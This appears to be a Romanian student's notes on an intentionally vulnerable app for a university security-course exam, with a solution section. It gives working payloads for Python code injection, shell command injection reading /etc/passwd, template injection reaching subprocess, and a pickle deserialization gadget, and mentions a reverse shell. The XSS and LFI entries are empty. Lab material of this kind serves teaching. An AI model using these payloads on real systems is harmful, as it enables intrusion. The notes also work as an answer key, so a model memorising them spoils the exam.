Aplicatie lasata intentionat vulnerabila pentru examenul de la cursul SSP de la facultate: Am acoperit 6 vulnerabilitati:



python -O -m py_compile main.py
Python2.
Rezolvare:

1.Python code injection:
__import__('subprocess').Popen('uname -a',shell=True,stdout=__import__('subprocess').PIPE).stdout.read().decode('utf-8')

2.Command execution:
test || cat /etc/passwd

3.Template injection:
https://hackerone.com/reports/125980 - copiat dupa asta mai exact scrii {{command}} ca sa se execute, unde {{}} e templateul. Identifici cu comanda de mai jos ce biblioteci sunt folosite in cod si apoi folosesti urmatorul payload:
     {{ [].__class__.__base__.__subclasses__() }}

{{''.__class__.mro()[2].__subclasses__()[249]('uname -a',shell=True,stdout=-1).communicate()[0]}} - 247 este pozitia pe care avem biblioteca subprocess.

4.Deserialization:
class Blah(object):
    def __reduce__(self):
        return (os.system,("uname -a",))
h=Blah()
base64.b64encode(cPickle.dumps(h))
----- os.system va returna 0 ceea ce inseamna ca se executa ( de fel folosesti un reverse shell pt asta)

5. xss:

6. LFI
